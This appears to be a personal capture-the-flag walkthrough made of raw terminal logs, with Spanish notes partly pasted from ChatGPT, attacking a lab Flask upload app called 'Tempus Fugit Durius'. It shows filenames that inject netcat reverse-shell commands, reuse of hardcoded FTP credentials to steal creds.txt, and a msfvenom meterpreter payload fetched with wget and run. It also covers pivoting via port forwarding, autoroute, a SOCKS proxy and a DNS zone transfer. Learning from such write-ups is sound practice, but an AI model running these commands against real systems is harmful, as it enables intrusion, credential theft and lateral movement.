                <button class="btn btn-primary" href="#" data-dismiss="modal">
                  <i class="fas fa-times fa-fw"></i>
                  Close Window
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- Portfolio Modal 6 -->
  <div class="portfolio-modal modal fade" id="portfolioModal6" tabindex="-1" role="dialog" aria-labelledby="portfolioModal6Label" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
      <div class="modal-content">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">
            <i class="fas fa-times"></i>
          </span>
        </button>
        <div class="modal-body text-center">
          <div class="container">
            <div class="row justify-content-center">
              <div class="col-lg-8">
                <!-- Portfolio Modal - Title -->
                <h2 class="portfolio-modal-title text-secondary text-uppercase mb-0">Submarine</h2>
                <!-- Icon Divider -->
                <div class="divider-custom">
                  <div class="divider-custom-line"></div>
                  <div class="divider-custom-icon">
                    <i class="fas fa-star"></i>
                  </div>
                  <div class="divider-custom-line"></div>
                </div>
                <!-- Portfolio Modal - Image -->
                <img class="img-fluid rounded mb-5" src="static/img/000033submarine.png" alt="">
                <!-- Portfolio Modal - Text -->
                <p class="mb-5">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Mollitia neque assumenda ipsam nihil, molestias magnam, recusandae quos quis inventore quisquam velit asperiores, vitae? Reprehenderit soluta, eos quod consequuntur itaque. Nam.</p>
                <button class="btn btn-primary" href="#" data-dismiss="modal">
                  <i class="fas fa-times fa-fw"></i>
                  Close Window
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- Bootstrap core JavaScript -->
  <script src="static/js/000048jquery.min.js"></script>
  <script src="static/js/000042bootstrap.bundle.min.js"></script>

  <!-- Plugin JavaScript -->
  <script src="static/js/000037jquery.easing.min.js"></script>

  <!-- Contact Form JavaScript -->
  <script src="static/js/000011jqBootstrapValidation.js"></script>
  <script src="static/js/000012contact_me.js"></script>

  <!-- Custom scripts for this template -->
  <script src="static/js/000014freelancer.min.js"></script>

</body>

bash-4.4$ cat prestart.sh
cat prestart.sh
#! /usr/bin/env sh

echo "Running inside /app/prestart.sh, you could add migrations to this file, e.g.:"

echo "
#! /usr/bin/env bash

# Let the DB start
sleep 10;
# Run migrations
alembic upgrade head
"

bash-4.4$ cat supervisord.pid
cat supervisord.pid
1

bash-4.4$ cat debug
cat debug
!#/bin/bash
export FLASK_APP=main.py
export DEBUG=1
flask run --host=0.0.0.0 --port=80

bash-4.4$ cat my-form.html
cat my-form.html
<!DOCTYPE html>
<head>

  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="">
  <meta name="author" content="">
<!-- Custom fonts for this theme -->
  <link href="static/css/000058all.min.css" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Lato:400,700,400italic,700italic" rel="stylesheet" 
type="text/css">

  <!-- Theme CSS -->
  <link href="static/css/000010freelancer.min.css" rel="stylesheet">
  <title>upload</title>


</head>
<html lang="en">
  <!-- Navigation -->
  <nav class="navbar navbar-expand-lg bg-secondary text-uppercase fixed-top" id="mainNav">
    <div class="container">
      <a class="navbar-brand js-scroll-trigger" href="#page-top">Tempus Fugit Durius</a>
      <button class="navbar-toggler navbar-toggler-right text-uppercase font-weight-bold bg-primary text-white rounded" 
type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" 
aria-label="Toggle navigation">
        Menu
        <i class="fas fa-bars"></i>
      </button>
      <div class="collapse navbar-collapse" id="navbarResponsive">
        <ul class="navbar-nav ml-auto">
          <li class="nav-item mx-0 mx-lg-1">
            <a class="nav-link py-3 px-0 px-lg-3 rounded js-scroll-trigger" href="{{ url_for('home') }}">Back</a>
          </li>
        </ul>
      </div>
    </div>
  </nav>
<body bgcolor='#28a745'>
<header class="masthead bg-primary text-white text-center">
<div class=container d-flex align-items-center flex-column>
    <center><h1>Upload script</h1>
    <form action="/upload" method="POST" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit" name="my-form" value="Upload !">
    </form></center>
</div>
</header>
<p>
	{% with messages = get_flashed_messages() %}
	  {% if messages %}
		<ul class=flashes>
		{% for message in messages %}
		  <li>{{ message }}</li>
		{% endfor %}
		</ul>
	  {% endif %}
	{% endwith %}
</p>

</body>
</html>

bash-4.4$ cd upload
cd upload
bash-4.4$ ls
ls
a.txt;nc 168301415 -e sh       a.txt;nc 168301415 443 -e ssh
a.txt;nc 168301415 443 -e sh   test.txt;nc 168301415 -e bash

bash-4.4$ cat main.cpython-36.pyc

or uploading�zThat filename was way too long!zcat r	T)r
                                                           zutf-8z�File successfully uploadedz
                                                                                              ftp.mofo.pwnsomeud


bash-4.4$ cat uwsgi.ini
cat uwsgi.ini
[uwsgi]
module = main
callable = app
uid=www
gid=www

bash-4.4$ cat main.py
cat main.py
import os
import urllib.request
from flask import Flask, flash, request, redirect, render_template
from ftplib import FTP
import subprocess

UPLOAD_FOLDER = 'upload'
ALLOWED_EXTENSIONS = {'txt', 'rtf'}

app = Flask(__name__)
app.secret_key = "mofosecret"
app.config['MAX_CONTENT_LENGTH'] = 2 * 1024 * 1024



@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
      cmd = 'fortune'
      result = subprocess.check_output(cmd, shell=True)
      return "<h1>400 - Sorry. I didn't find what you where looking for.</h1> <h2>Maybe this will cheer you up:</h2><h3>"+result.decode("utf-8")+"</h3>"
@app.errorhandler(500)
def internal_error(error):
    return "<h1>500?! - What are you trying to do here?!</h1>"

@app.route('/')

def home():
	return render_template('index.html')
	

@app.route('/upload')

def upload_form():
	try:
	    return render_template('my-form.html')
	except Exception as e:
	    return render_template("500.html", error = str(e))


def allowed_file(filename):
           check = filename.rsplit('.', 1)[1].lower()
           check = check[:3] in ALLOWED_EXTENSIONS    
           return check

def filtering(filename):
           filtered = filename.replace("#","")
           return filtered


@app.route('/upload', methods=['POST'])
def upload_file():
	if request.method == 'POST':

		if 'file' not in request.files:
			flash('No file part')
			return redirect(request.url)
		file = request.files['file']
		if file.filename == '':
			flash('No file selected for uploading')
			return redirect(request.url)
		if len(file.filename) > 30:
			flash('That filename was way too long!')
			return redirect(request.url)
 
		if file.filename and allowed_file(file.filename):
			filename = file.filename
			filename = filtering(filename)
			file.save(os.path.join(UPLOAD_FOLDER, filename))
			cmd="cat "+UPLOAD_FOLDER+"/"+filename
			result = subprocess.check_output(cmd, shell=True)
			flash(result.decode("utf-8"))
			flash('File successfully uploaded')
			
			try:
			   ftp = FTP('ftp.mofo.pwn')
			   ftp.login('someuser', '04653cr37Passw0rdK06')
			   with open(UPLOAD_FOLDER+"/"+filename, 'rb') as f:
			      ftp.storlines('STOR %s' % filename, f)
			      ftp.quit()
			      os.remove(UPLOAD_FOLDER+"/"+filename)
			except:
			   flash("Cannot connect to FTP-server")
			return redirect('/upload')

		else:
			flash('Allowed file types are txt and rtf')
			return redirect(request.url)








if __name__ == "__main__":
    app.run()

ftp = FTP('ftp.mofo.pwn')
ftp.login('someuser', '04653cr37Passw0rdK06')

┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ ftp 10.10.238.9  
ftp: Can't connect to `10.10.238.9:21': Connection refused
ftp: Can't connect to `10.10.238.9:ftp'

bash-4.4$ ftp 10.10.238.9
ftp 10.10.238.9
bash: ftp: command not found

using python

┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ cat ftp.py       
#!/usr/bin/python

from ftplib import FTP

ftp = FTP()
ftp.connect("ftp.mofo.pwn", 21)
ftp.login("someuser", "04653cr37Passw0rdK06")
ftp.retrlines("LIST",lambda line: print(line))
ftp.quit()

└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.238.9 - - [26/Jan/2023 13:39:16] "GET /ftp.py HTTP/1.1" 200 -

bash-4.4$ wget http://10.8.19.103:8000/ftp.py
wget http://10.8.19.103:8000/ftp.py
Connecting to 10.8.19.103:8000 (10.8.19.103:8000)
ftp.py               100% |*******************************|   187   0:00:00 ETA
bash-4.4$ python3 ftp.py
python3 ftp.py
-rw-------    1 ftp      ftp             2 Jan 26 18:06 a.txt
-rw-------    1 ftp      ftp            24 Apr 22  2020 creds.txt
-rw-------    1 ftp      ftp            26 Jan 26 17:50 file.txt;id
-rw-------    1 ftp      ftp             4 Jan 26 17:51 test.txt
-rw-------    1 ftp      ftp             4 Jan 26 17:52 test.txt;id
-rw-------    1 ftp      ftp            13 Jan 26 17:54 test2.txt

thanks chatGPT

Para realizar un login FTP con Python, se puede utilizar la biblioteca ftplib que proporciona Python.
Se utiliza el método "connect" para conectarse al servidor ftp.mofo.pwn en el puerto 21, que es el puerto predeterminado para FTP.

Luego, se utiliza el método "login" para iniciar sesión en el servidor con el nombre de usuario y contraseña proporcionados.

El método "retrlines" de la biblioteca ftplib de Python se utiliza para recibir líneas de texto desde el servidor FTP.
La lista devuelta se pasa a una función lambda que imprime cada línea recibida. Finalmente, se utiliza el método "quit" para cerrar la conexión con el servidor.

with open("creds.txt", "wb") as local_file:
    ftp.retrbinary("RETR creds.txt", local_file.write)


En este ejemplo, se abre un archivo "creds.txt" en modo binario (wb) y se almacena en una variable "local_file". Luego se utiliza el método "retrbinary" para descargar el archivo "creds.txt" del servidor. El primer argumento es "RETR creds.txt" que indica al servidor que queremos descargar el archivo "creds.txt", y el segundo argumento es "local_file.write" que indica dónde se debe guardar el archivo descargado.


finally

┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ cat ftp.py                                              
#!/usr/bin/python

from ftplib import FTP

ftp = FTP()
ftp.connect("ftp.mofo.pwn", 21)
ftp.login("someuser", "04653cr37Passw0rdK06")
ftp.retrlines("LIST",lambda line: print(line))
with open("creds.txt", "wb") as local_file:
    ftp.retrbinary("RETR creds.txt", local_file.write)
ftp.quit()
                                                                             
┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.219.88 - - [26/Jan/2023 13:57:48] "GET /ftp.py HTTP/1.1" 200 -

ash-4.4$ wget http://10.8.19.103:8000/ftp.py
wget http://10.8.19.103:8000/ftp.py
Connecting to 10.8.19.103:8000 (10.8.19.103:8000)
ftp.py               100% |*******************************|   290   0:00:00 ETA
bash-4.4$ python3 ftp.py
python3 ftp.py
-rw-------    1 ftp      ftp            24 Apr 22  2020 creds.txt
bash-4.4$ cat creds.txt
cat creds.txt
admin:BAraTuwwWzx3gG

possible admin panel login credentials.

cd /home
bash-4.4$ ls
ls
www
bash-4.4$ cd www
cd www
bash-4.4$ ls
ls
bash-4.4$ ls -lah
ls -lah
total 8
drwxr-sr-x    2 www      www         4.0K Apr 22  2020 .
drwxr-xr-x    3 root     root        4.0K Apr 22  2020 ..

bash-4.4$ ls -lah
ls -lah
total 76
drwxr-xr-x  146 root     root        4.0K Apr 22  2020 .
drwxr-xr-x  146 root     root        4.0K Apr 22  2020 ..
-rwxr-xr-x    1 root     root           0 Apr 22  2020 .dockerenv
drwxr-xr-x   28 www      www         4.0K Jan 26 18:57 app
drwxr-xr-x    2 root     root        4.0K Aug  8  2019 bin
drwxr-xr-x    5 root     root         360 Jan 26 18:44 dev
-rwxr-xr-x    1 root     root        1.8K May 17  2019 entrypoint.sh
drwxr-xr-x   55 root     root        4.0K Apr 22  2020 etc
drwxr-xr-x    3 root     root        4.0K Apr 22  2020 home
drwxr-xr-x   16 root     root        4.0K Apr 22  2020 lib
drwxr-xr-x    5 root     root        4.0K Jan 30  2019 media
drwxr-xr-x    2 root     root        4.0K Jan 30  2019 mnt
dr-xr-xr-x   97 root     root           0 Jan 26 18:44 proc
drwx------    9 root     root        4.0K Aug 16  2019 root
drwxr-xr-x    2 root     root        4.0K Jan 26 18:44 run
drwxr-xr-x    2 root     root        4.0K Aug 11  2019 sbin
drwxr-xr-x    2 root     root        4.0K Jan 30  2019 srv
-rwxr-xr-x    1 root     root         404 May 16  2019 start.sh
dr-xr-xr-x   13 root     root           0 Jan 26 18:44 sys
drwxrwxrwt    2 root     root        4.0K Jan 26 18:44 tmp
drwxr-xr-x   59 root     root        4.0K Apr 22  2020 usr
-rwxr-xr-x    1 root     root        2.9K May 16  2019 uwsgi-nginx-entrypoint.sh
drwxr-xr-x   40 root     root        4.0K Apr 22  2020 var


we are in a docker container

.dockerenv

bash-4.4$ ip add
ip add
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
9: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:c0:a8:96:0a brd ff:ff:ff:ff:ff:ff
    inet 192.168.150.10/24 brd 192.168.150.255 scope global eth0
       valid_lft forever preferred_lft forever
bash-4.4$ netstat -anp
netstat -anp
netstat: showing only processes with your user ID
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.11:38865        0.0.0.0:*               LISTEN      -
tcp        0      0 192.168.150.10:34441    10.8.19.103:443         ESTABLISHED 18/sh
udp        0      0 127.0.0.11:44396        0.0.0.0:*                           -
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node PID/Program name    Path
unix  2      [ ACC ]     STREAM     LISTENING      14611 -                   /tmp/uwsgi.sock
unix  2      [ ACC ]     STREAM     LISTENING      14567 -                   /run/supervisord.sock.1

using metasploit

┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ msfconsole
                                                  
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


       =[ metasploit v6.2.33-dev                          ]
+ -- --=[ 2275 exploits - 1192 auxiliary - 406 post       ]
+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: When in a module, use back to go 
back to the top level prompt
Metasploit Documentation: https://docs.metasploit.com/

msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.8.19.103
LHOST => 10.8.19.103
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.8.19.103:4444 

┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ msfvenom -p /linux/x86/meterpreter/reverse_tcp LHOST=10.8.19.103 LPORT=4444 -f elf > shell.elf
Error: invalid payload: /linux/x86/meterpr┌─┌┌┌┌┌┌─┌┌┌┌┌┌┌┌┌┌┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.8.19.103 LPORT=4444 -f elf > shell.elf 
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes

                                                             
┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ ls                                
'a.txt;nc 168301415 443 -e sh'   ftp.py   shell.elf


┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ python3 -m http.server 8000 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.36.116 - - [26/Jan/2023 16:49:59] "GET /shell.elf HTTP/1.1" 200 -


bash-4.4$ wget http://10.8.19.103:8000/shell.elf
wget http://10.8.19.103:8000/shell.elf
Connecting to 10.8.19.103:8000 (10.8.19.103:8000)
shell.elf            100% |*******************************|   207   0:00:00 ETA
bash-4.4$ chmod +x shell.elf
chmod +x shell.elf
bash-4.4$ ./shell.elf
./shell.elf


msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.8.19.103:4444 
[*] Sending stage (1017704 bytes) to 10.10.36.116
[*] Meterpreter session 1 opened (10.8.19.103:4444 -> 10.10.36.116:38760) at 2023-01-26 16:50:27 -0500

meterpreter > ipconfig

Interface  1
============
Name         : lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 65536
Flags        : UP,LOOPBACK
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0


Interface  9
============
Name         : eth0
Hardware MAC : 02:42:c0:a8:96:0a
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.168.150.10
IPv4 Netmask : 255.255.255.0

What we can see here is, there is another host up located in **Interface 9** with IP address **“192.168.150.10”**. At this point, we need to escape from this container and access to the host located on **Interface 9**. In order to do that, we need to do **port forwarding**

El reenvío de puertos es una técnica utilizada para redirigir el tráfico de red desde un puerto específico de un dispositivo de red, como un router, a otro dispositivo en la red. Esto se utiliza a menudo para permitir que los dispositivos en una red privada, como una computadora personal o un servidor, sean accesibles desde Internet.

Un ejemplo común de uso de reenvío de puertos es configurar un servidor web en su red privada para que pueda ser accedido desde Internet. Sin el reenvío de puertos, los visitantes de su sitio web solo podrían acceder a él si estuvieran en su red privada. Sin embargo, configurando el reenvío de puertos en su router para redirigir el tráfico del puerto 80 (el puerto utilizado por defecto para el protocolo HTTP) a su servidor web, los visitantes de su sitio web podrán acceder a él desde cualquier lugar.

Un ejemplo concreto sería, si tienes un servidor web en tu red privada con la dirección IP 192.168.1.100 y quieres que los visitantes de Internet puedan acceder a él a través del puerto 80. Entonces, configurarías el reenvío de puertos en tu router para redirigir todo el tráfico entrante al puerto 80 a la dirección IP 192.168.1.100. De esta manera, cuando alguien escriba tu dirección IP pública en su navegador y acceda al puerto 80, su tráfico será redirigido al servidor web en tu red privada.

Una de las funciones de Meterpreter es el reenvío de puertos (port forwarding). Esto permite a un atacante redirigir el tráfico desde un puerto específico en un sistema comprometido a otro sistema en la red.

Para utilizar la función de reenvío de puertos de Meterpreter, primero debes obtener acceso a un sistema comprometido utilizando una de las muchas técnicas de explotación disponibles en Metasploit. Una vez que se ha obtenido acceso, se puede utilizar el comando "portfwd" para establecer una regla de reenvío de puertos.

Un ejemplo de uso sería:

meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.1.100

En este ejemplo, se establece una regla para redirigir todo el tráfico entrante al puerto 3389 (el puerto utilizado para conectarse a un sistema Windows mediante RDP) al sistema con la dirección IP 192.168.1.100 en la red interna.

meterpreter > portfwd add -l 8888 -p 80 -r 192.168.150.10
[*] Forward TCP relay created: (local) :8888 -> (remote) 192.168.150.10:80

http://localhost:8888/ (Tempus Fugit Durius)

At this point, we need to discover other hosts on **“192.168.150.0/24”** **subnet.**

"meterpreter run autoroute" es un comando de Meterpreter que se utiliza para automatizar la configuración de una ruta de red en un sistema comprometido. Este comando utiliza la herramienta "route" para establecer una ruta para una subred específica a través de un gateway específico, lo que permite a un atacante acceder a sistemas y redes adicionales una vez que se ha comprometido un sistema inicial.

El flag "-p" es para indicar que se quiere hacer una ruta persistente, es decir que se mantendra activa después de un reinicio del sistema.

Ejemplo:

meterpreter > run autoroute -s 192.168.1.0/24 -n 192.168.1.1 -p

En este ejemplo, se establece una ruta para la subred 192.168.1.0/24 a través del gateway 192.168.1.1. Y se establece como persistente.

meterpreter > search -f resolv.conf
Found 1 result...
=================

Path              Size (bytes)  Modified (UTC)
----              ------------  --------------
/etc/resolv.conf  54            2023-01-26 15:59:24 -0500

meterpreter > cat /etc/resolv.conf
search mofo.pwn
nameserver 127.0.0.11
options ndots:0


meterpreter > background

https://infinitelogins.com/2021/02/20/using-metasploit-routing-and-proxychains-for-pivoting/

msf6 post(multi/manage/autoroute) > sessions

Active sessions
===============

  Id  Name  Type                   Information           Connection
  --  ----  ----                   -----------           ----------
  1         meterpreter x86/linux  www @ 192.168.150.10  10.8.19.103:4444 -> 10.10.36.116:38988 (192.168.150.10)
  2         meterpreter x86/linux  www @ 192.168.150.10  10.8.19.103:4444 -> 10.10.36.116:38989 (192.168.150.10)

msf6 post(multi/manage/autoroute) > options

Module options (post/multi/manage/autoroute):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, autoadd, print, delete, def
                                       ault)
   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
   SESSION                   yes       The session to run this module on
   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)


View the full module info with the info, or info -d command.


msf6 post(multi/manage/autoroute) > set SUBNET 102.168.150.0/24
SUBNET => 102.168.150.0/24
msf6 post(multi/manage/autoroute) > set SESSION 2
SESSION => 2
msf6 post(multi/manage/autoroute) > options

Module options (post/multi/manage/autoroute):

   Name     Current Setting   Required  Description
   ----     ---------------   --------  -----------
   CMD      autoadd           yes       Specify the autoroute command (Accepted: add, autoadd, print, delete, de
                                        fault)
   NETMASK  255.255.255.0     no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
   SESSION  2                 yes       The session to run this module on
   SUBNET   102.168.150.0/24  no        Subnet (IPv4, for example, 10.10.10.0)


View the full module info with the info, or info -d command.

msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 192.168.150.10
[*] Searching for subnets to autoroute.
[+] Route added to subnet 192.168.150.0/255.255.255.0 from host's routing table.
[*] Post module execution completed
msf6 post(multi/manage/autoroute) > route print

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   192.168.150.0      255.255.255.0      Session 2

[*] There are currently no IPv6 routes defined.

┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ tail /etc/proxychains.conf 
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4 127.0.0.1 9050	
socks5 127.0.0.1 9050

msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > options

Module options (auxiliary/server/socks_proxy):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   SRVHOST   0.0.0.0          yes       The local host or network interface to listen on. This must be an addres
                                        s on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT   1080             yes       The port to listen on
   USERNAME                   no        Proxy username for SOCKS5 listener
   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server



View the full module info with the info, or info -d command.

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > options

Module options (auxiliary/server/socks_proxy):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   SRVHOST   0.0.0.0          yes       The local host or network interface to listen on. This must be an addres
                                        s on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT   9050             yes       The port to listen on
   USERNAME                   no        Proxy username for SOCKS5 listener
   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server



View the full module info with the info, or info -d command.


┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ sudo proxychains nmap -n -sT -Pn -p 22,80 192.168.150.0/24 
[sudo] password for kali: 
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-26 17:56 EST
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.1:80  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.4:80 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.7:80 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.10:80  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.11:80 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.14:80 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.17:80 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.20:80 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.23:80 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.26:80 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.29:80 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.32:80 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.35:80 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.38:80 


Found 
 
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.1:80  ...  OK

now portforwarding

meterpreter > portfwd add -l 8888 -p 80 -r 192.168.150.1
[*] Forward TCP relay created: (local) :8888 -> (remote) 192.168.150.1:80

http://localhost:8888/ (More Focus)

https://www.howtouselinux.com/post/dns-port
dig axfr mofo.pwn

This appears to be a command to perform a zone transfer (AXFR) of a DNS zone using the dig (Domain Information Groper) tool. The domain specified is "mofo.pwn," which may be a placeholder for a real domain. However, I would like to remind you that unauthorized access to someone else's DNS zone is considered illegal, and please refrain from any illegal activities.

AXFR (Full Zone Transfer) es un protocolo de DNS que permite a un servidor de DNS secundario obtener una copia completa de una zona de DNS de un servidor primario autorizado. Esto se utiliza para mantener la consistencia de la información de DNS entre los servidores primario y secundario. Sin embargo, es importante tener en cuenta que los servidores de DNS deben estar configurados correctamente para permitir las transferencias de zona y sólo los servidores de DNS autorizados deben tener acceso a ellas.

meterpreter > shell
Process 28 created.
Channel 11 created.
 
dig axfr mofo.pwn

; <<>> DiG 9.11.8 <<>> axfr mofo.pwn
;; global options: +cmd
mofo.pwn.		14400	IN	SOA	ns1.mofo.pwn. admin.mofo.pwn. 14 7200 120 2419200 604800
mofo.pwn.		14400	IN	TXT	"v=spf1 ip4:176.23.46.22 a mx ~all"
mofo.pwn.		14400	IN	NS	ns1.mofo.pwn.
durius.mofo.pwn.	14400	IN	A	192.168.150.1
ftp.mofo.pwn.		14400	IN	CNAME	punk.mofo.pwn.
gary.mofo.pwn.		14400	IN	A	192.168.150.15
geek.mofo.pwn.		14400	IN	A	192.168.150.14
kfc.mofo.pwn.		14400	IN	A	192.168.150.17
leet.mofo.pwn.		14400	IN	A	192.168.150.13
mail.mofo.pwn.		14400	IN	TXT	"v=spf1 a -all"
mail.mofo.pwn.		14400	IN	A	192.168.150.11
milo.mofo.pwn.		14400	IN	A	192.168.150.16
newcms.mofo.pwn.	14400	IN	CNAME	durius.mofo.pwn.
ns1.mofo.pwn.		14400	IN	A	192.168.150.100
punk.mofo.pwn.		14400	IN	A	192.168.150.12
sid.mofo.pwn.		14400	IN	A	192.168.150.10
www.mofo.pwn.		14400	IN	CNAME	sid.mofo.pwn.
